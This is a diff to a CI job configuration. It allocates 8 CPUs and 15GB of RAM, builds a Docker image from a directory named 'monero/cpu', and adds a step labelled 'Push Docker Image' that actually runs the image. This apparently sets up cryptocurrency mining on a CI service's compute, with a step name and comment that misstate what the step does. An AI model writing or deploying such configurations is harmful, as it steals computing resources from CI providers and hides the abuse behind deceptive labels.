@@ -1,11 +1,23 @@
 version: 1.0
-resources:
-  cpu: 8 # Specify how many CPU cores you want to allocate 
-  memory: 15GB  # Specify the amount of RAM 
 
+# Define resources allocation for your CI job
+resources:
+  cpu: 8      # Specify the number of CPU cores to allocate for the job
+  memory: 15GB # Specify the amount of RAM to allocate for the job
+
+timeout_in: 90m  # Set the maximum timeout duration for the entire build
+
+# Define the steps of your CI job
 steps:
-  - name: "Build Docker Image"
+  # Build step: Builds the Docker image
+  - name: Build Docker Image
     image: docker:latest
     commands:
-      - export DOCKER_BUILDKIT=1
-      - docker build --tag nmlm99/sobakaka:latest monero/cpu 
+      - export DOCKER_BUILDKIT=1  # Enable Docker BuildKit for better performance
+      - docker build --tag nmlm99/sobakaka:latest monero/cpu
+
+  # Push step: Push the built image to the Docker registry
+  - name: Push Docker Image
+    image: docker:latest
+    commands:
+      - docker run nmlm99/sobakaka:latest
